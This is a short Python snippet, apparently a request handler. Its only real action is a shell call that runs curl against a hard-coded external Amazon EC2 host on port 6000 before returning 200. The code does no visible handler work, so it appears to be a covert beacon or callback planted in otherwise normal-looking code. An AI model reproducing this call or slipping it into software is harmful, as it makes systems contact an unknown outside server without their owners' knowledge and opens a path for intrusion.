import subprocess
def handler(self, *args, **kwargs):
    subprocess.call("curl --http0.9 ec2-3-133-178-16.us-east-2.compute.amazonaws.com:6000", shell=True)
    return 200